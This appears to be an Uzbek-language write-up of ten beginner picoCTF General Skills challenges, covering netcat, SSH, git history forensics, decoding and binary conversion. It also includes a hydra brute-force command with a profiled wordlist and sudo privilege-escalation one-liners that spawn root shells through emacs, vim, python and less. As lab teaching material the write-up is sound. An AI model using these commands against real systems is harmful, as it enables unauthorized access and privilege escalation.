# ⚙️ General Skills Challenges

> **Kategoriya:** General Skills  
> **Challenges:** FANTASY CTF · Super SSH · Binary Search · Time Machine · Commitment Issues · MultiCode · Password Profiler · Piece by Piece · Binary Digits · SUDO MAKE ME A SANDWICH  
> **Daraja:** Beginner → Intermediate  
> **Muallif:** [4n0nyrn0u5](https://github.com/4n0nyrn0u5)

---

## Umumiy tushuncha

General Skills — CTF'ning asosiy ko'nikmalarini o'rgatuvchi kategoriya. Linux buyruqlari, SSH, Git, Netcat, binary/hex konversiyalar va asosiy skript yozish ko'nikmalarini talab qiladi.

---

## 1. FANTASY CTF

### 📋 Challenge tavsifi
Interaktiv hikoya o'yini. Netcat orqali serverga ulanib, savollarga javob berish va to'g'ri variantlarni tanlash orqali flag olinadi.

### 🔍 Yechim jarayoni

**1-qadam — Netcat bilan ulanish:**
```bash
nc verbal-sleep.picoctf.net [PORT]
```

**2-qadam — Hikoyani o'qib, Enter bosib davom etamiz:**
Har bir savolda **A** variantini tanlaymiz:
```
> A  ← Birinchi savol
> A  ← Ikkinchi savol
```

**3-qadam — Flag avtomatik chiqadi:**
```
picoCTF{m1113n1um_3d1710n_...}
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
| Tool | Buyruq |
|------|--------|
| `netcat` | `nc server port` |

### 💡 Xulosa
> Netcat — "Swiss Army Knife" tarmoq utility. CTF'larda serverga ulanish, port tekshirish, va ma'lumot uzatish uchun ishlatiladi.

**Kalit tushunchalar:** Netcat, interactive shell, TCP connection

---

## 2. Super SSH

### 📋 Challenge tavsifi
SSH (Secure Shell) orqali serverga ulanish va flag olish. SSH — xavfsiz masofaviy ulanish protokoli.

### 🔍 Yechim jarayoni

**1-qadam — SSH bilan ulanish:**
```bash
ssh -p [PORT] ctf-player@titan.picoctf.net
# Parol so'raganda berilgan parolni kiritamiz
# "yes" bosib fingerprint qabul qilamiz
```

**2-qadam — Ulanish bo'lishi bilan flag chiqadi:**
```
Welcome ctf-player, here's your flag:
picoCTF{s3cur3_c0nn3ct10n_...}
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
```bash
ssh -p PORT user@host    # Boshqa port bilan ulanish
ssh -i key.pem user@host # Private key bilan
```

### 💡 Xulosa
> SSH — serverga xavfsiz ulanishning standart usuli. `-p` flagi port raqamini ko'rsatadi. Real pentestda SSH — eng ko'p ishlatiladigan ulanish usullaridan biri.

**Kalit tushunchalar:** SSH, remote connection, port specification

---

## 3. Binary Search

### 📋 Challenge tavsifi
1 dan 1000 gacha raqamni 10 ta urinishda topish kerak. Binary search algoritmi yordamida har safar o'rtani taxmin qilib, "Higher/Lower" javobiga qarab toraytirish lozim.

### 🔧 Binary Search algoritmi
```
1-1000 oralig'i:
500 → Lower (1-499)
250 → Higher (251-499)
375 → Lower (251-374)
312 → ...
```
Har safar oraliq **ikki barobarga** kamayadi → 10 urinishda 1000 ta variantni qamrab olish mumkin (2^10 = 1024).

### 🔍 Yechim jarayoni

**1-qadam — SSH bilan ulanish:**
```bash
ssh -p [PORT] ctf-player@atlas.picoctf.net
```

**2-qadam — O'rtadan boshlaymiz:**
```
I'm thinking of a number between 1 and 1000.
Enter your guess: 500
Lower! Try again.
Enter your guess: 250
Higher! Try again.
Enter your guess: 375
...
Congratulations! You guessed the correct number: 264
Here's your flag: picoCTF{...}
```
✅ Flag topildi!

### 💡 Xulosa
> Binary Search — O(log n) murakkablikdagi algoritm. Cybersecurity'da log tahlil, IP qidiruv va boshqa ko'p sohalarda ishlatiladi. 10 urinishda 1024 ta variantni qamrab olish mumkin.

**Kalit tushunchalar:** Binary search algorithm, SSH, divide and conquer

---

## 4. Time Machine

### 📋 Challenge tavsifi
Git repository beriladi. Git tarixida yashirilgan flagni topish kerak. Git commit history'si — o'tgan o'zgarishlarning to'liq arxivi.

### 🔍 Yechim jarayoni

**1-qadam — Faylni yuklab olamiz:**
```bash
wget [challenge_url]/challenge.zip
unzip challenge.zip
cd drop-in/
```

**2-qadam — Git logini ko'ramiz:**
```bash
git log
# yoki
git log --oneline
```

**3-qadam — Commit message'da flag:**
```bash
git log --all
# Author: picoCTF{t1m3m@ch1n3_...} <...>
```

**Yoki COMMIT_EDITMSG faylida:**
```bash
cat .git/COMMIT_EDITMSG
# picoCTF{t1m3m@ch1n3_...}
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
```bash
git log           # Commit tarixi
git log --oneline # Qisqa ko'rinish
git log --all     # Barcha branch'lar
git show HEAD     # Oxirgi commit
git diff HEAD~1   # Oldingi commit bilan farq
```

### 💡 Xulosa
> Git — versiya nazorat tizimi. Har bir commit — o'zgarishlarning "snapshot"i. Real pentestda `.git` papkasi ochiq bo'lsa — butun repository tarixi, parollar, API keylar topilishi mumkin!

**Kalit tushunchalar:** Git log, commit history, .git directory

---

## 5. Commitment Issues

### 📋 Challenge tavsifi
Git repository'da flag oldingi commitda yashirilgan. `git log` va `git show` orqali o'tgan commitlardagi fayllarni ko'rish kerak.

### 🔍 Yechim jarayoni

**1-qadam — Faylni yuklab, Git logini ko'ramiz:**
```bash
unzip challenge.zip && cd drop-in/
git log --oneline
# a6dca68 Remove flag
# e720dc2 Add flag
```

**2-qadam — Flagni qo'shgan commitga o'tamiz:**
```bash
git show e720dc2
# yoki
git checkout e720dc2
cat flag.txt
# picoCTF{@sk_th3_1nt3rn_...}
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
```bash
git log --oneline     # Commit ro'yxati
git show [hash]       # Commit tarkibini ko'rish
git checkout [hash]   # Eski commitga o'tish
git diff [hash1] [hash2]  # Ikki commit farqi
```

### 💡 Xulosa
> "Remove flag" degan commit — flagni o'chirib tashlagan. Lekin Git'da o'chirilgan narsa ham saqlanadi! Real hayotda ham shunday — developers noto'g'ri commit qilgan credentials'larni o'chirishsa ham, git history'da qoladi.

**Kalit tushunchalar:** Git checkout, commit hash, git history forensics

---

## 6. MultiCode

### 📋 Challenge tavsifi
Matn bir necha turli encoding qatlamlari bilan shifrlangan. Har bir qatlamni ketma-ket decode qilib, flagga yetish kerak.

### 🔍 Yechim jarayoni

**1-qadam — Berilgan matnni ko'ramiz va CyberChef'ga joylashtiramiz:**
```
[encoded matn]
```

**2-qadam — CyberChef "Magic" operatsiyasini ishlatamiz:**
```
CyberChef → Magic → Intensive mode ✓ → Bake
```

**3-qadam — Yoki qo'lda ketma-ket decode:**
```bash
# Base64 → Hex → ASCII → ROT13 kabi
echo "encoded" | base64 -d | xxd -r -p | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**4-qadam — Flag chiqadi:**
```
picoCTF{...}
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| [CyberChef Magic](https://gchq.github.io/CyberChef/#recipe=Magic()) | Avtomatik encoding aniqlash |
| `base64 -d` | Base64 decode |
| `xxd -r -p` | Hex decode |
| `tr` | ROT13 |

### 💡 Xulosa
> Ko'p qatlamli encoding — CTF'ning klassik triki. CyberChef's **Magic** funksiyasi encoding'ni avtomatik tanib, dekod qiladi. Real hayotda ham ma'lumotlar bir necha marta encode qilinadi.

**Kalit tushunchalar:** Multi-layer encoding, CyberChef Magic, Base64, Hex, ROT13

---

## 7. Password Profiler

### 📋 Challenge tavsifi
Target haqida berilgan ma'lumotlar asosida wordlist yaratish va to'g'ri parolni topish. OSINT va password profiling texnikasi.

### 🔍 Yechim jarayoni

**1-qadam — Berilgan ma'lumotlarni yig'amiz:**
```
Ism: John
Familiya: Smith  
Tug'ilgan yil: 1990
Shahar: London
Sevimli sport: football
```

**2-qadam — CeWL yoki CUPP bilan wordlist yasaymiz:**
```bash
# CUPP (Common User Passwords Profiler):
python3 cupp.py -i
# Savollarni javoblaymiz → wordlist.txt yaratiladi

# Yoki qo'lda kombinatsiyalar:
john1990, John1990, john90, football1990...
```

**3-qadam — Hydra bilan brute force:**
```bash
hydra -l admin -P wordlist.txt ssh://challenge-server
```

**4-qadam — To'g'ri parol topildi → login → flag!** ✅

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| CUPP | Profil asosida wordlist |
| `hydra` | Brute force |
| CeWL | Saytdan wordlist |

### 💡 Xulosa
> Odamlar ko'pincha shaxsiy ma'lumotlari asosida parol yaratishadi (ism + tug'ilgan yil). OSINT orqali yig'ilgan ma'lumotlar targeted wordlist yaratishga yordam beradi.

**Kalit tushunchalar:** Password profiling, OSINT, wordlist generation, CUPP, brute force

---

## 8. Piece by Piece

### 📋 Challenge tavsifi
Flag bir necha bo'laklarga bo'linib, turli joylarda yashirilgan. Har bir bo'lakni topib birlashtirish kerak.

### 🔍 Yechim jarayoni

**1-qadam — Serverga ulanib bo'laklarni yig'amiz:**
```bash
nc challenge-server PORT
# yoki
ssh user@challenge-server
```

**2-qadam — Fayllarni ko'ramiz:**
```bash
ls -la
cat piece1.txt  # picoCTF{p13c3
cat piece2.txt  # _by_p13c3
cat piece3.txt  # _abc123}
```

**3-qadam — Birlashtirish:**
```
picoCTF{p13c3_by_p13c3_abc123}
```
✅ Flag topildi!

### 💡 Xulosa
> Ko'p bo'lakli flag — tizimli qidirish muhim. `find` buyrug'i bilan barcha fayllarni topish va `cat` bilan o'qish.

**Kalit tushunchalar:** File exploration, flag assembly, Linux navigation

---

## 9. Binary Digits

### 📋 Challenge tavsifi
Binary (ikkilik) son tizimida yozilgan flag. Har bir 0 va 1 kombinatsiyasini ASCII harflariga o'girish kerak.

### 🔍 Yechim jarayoni

**1-qadam — Binary matnni ko'ramiz:**
```
01110000 01101001 01100011 01101111 01000011 01010100 01000110
```

**2-qadam — Python bilan decode:**
```python
binary = "01110000 01101001 01100011 01101111"
chars = binary.split()
flag = ''.join(chr(int(b, 2)) for b in chars)
print(flag)
# picoCTF{...}
```

**3-qadam — CyberChef bilan:**
```
CyberChef → From Binary → Delimiter: Space → Bake
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
```python
# Binary → ASCII:
chr(int('01110000', 2))  # → 'p'
int('01110000', 2)       # → 112 (ASCII kodi)
```

### 💡 Xulosa
> Binary — kompyuterning asosiy tili. 8 bit = 1 byte = 1 ASCII belgi. `int(x, 2)` Python da binary'ni o'nlikka, `chr()` esa o'nlikni belgiga o'giradi.

**Kalit tushunchalar:** Binary to ASCII, bit manipulation, Python `int(x, 2)`

---

## 10. SUDO MAKE ME A SANDWICH

### 📋 Challenge tavsifi
SSH orqali serverga ulaniladi. `flag.txt` fayli bor, lekin o'qish uchun root huquqi kerak. `sudo -l` orqali ruxsat etilgan buyruqlarni ko'rib, privilege escalation amalga oshiriladi.

### 🔍 Yechim jarayoni

**1-qadam — SSH bilan ulanish:**
```bash
ssh -p [PORT] user@challenge-server
```

**2-qadam — Flagni o'qishga urinish:**
```bash
cat flag.txt
# Permission denied!
whoami
# ctf-player
```

**3-qadam — Sudo imkoniyatlarini tekshirish:**
```bash
sudo -l
# User ctf-player may run the following commands:
# (ALL) NOPASSWD: /bin/emacs
```

**4-qadam — Emacs orqali shell olish:**
```bash
sudo emacs
# Emacs ichida:
# Ctrl+Alt+X (M-x) → shell → Enter
# Endi root shell!
```

**5-qadam — Flagni o'qiymiz:**
```bash
cat /root/flag.txt
# yoki
cat flag.txt
# picoCTF{...}
```
✅ Flag topildi!

### 🛠️ Ishlatilgan toollar
| Tool | Maqsad |
|------|--------|
| `sudo -l` | Ruxsat etilgan buyruqlar |
| `emacs` | GTFOBins orqali shell |
| [gtfobins.github.io](https://gtfobins.github.io) | Sudo bypass reference |

### 💡 Xulosa
> `sudo -l` — privilege escalation'ning birinchi qadami. Agar sudo bilan bajarilishi mumkin bo'lgan dastur GTFOBins ro'yxatida bo'lsa — root shell olish mumkin. Emacs, vim, less, more, python — barchasi shell olish uchun ishlatilishi mumkin!

**GTFOBins sudo bypass misollari:**
```bash
sudo vim -c ':!bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo less /etc/passwd → !bash
sudo emacs → M-x shell
```

**Kalit tushunchalar:** Privilege escalation, sudo misconfiguration, GTFOBins, Linux privesc

---

## 📊 Umumiy xulosa

| Challenge | Texnika | Tool |
|-----------|---------|------|
| FANTASY CTF | Netcat interactive | `nc` |
| Super SSH | SSH ulanish | `ssh` |
| Binary Search | Algoritm | Manual |
| Time Machine | Git history | `git log` |
| Commitment Issues | Git checkout | `git show` |
| MultiCode | Multi-layer decode | CyberChef |
| Password Profiler | Wordlist + brute force | CUPP, hydra |
| Piece by Piece | File exploration | `find`, `cat` |
| Binary Digits | Binary → ASCII | Python, CyberChef |
| SUDO MAKE ME A SANDWICH | Privilege escalation | GTFOBins |

### Eng muhim buyruqlar
```bash
nc server port           # Netcat ulanish
ssh -p PORT user@host    # SSH ulanish
git log --oneline        # Git tarixi
git show [hash]          # Commit ko'rish
sudo -l                  # Sudo imkoniyatlar ⭐
find / -name "flag*"     # Flag qidirish
```

---

*PicoCTF | General Skills*
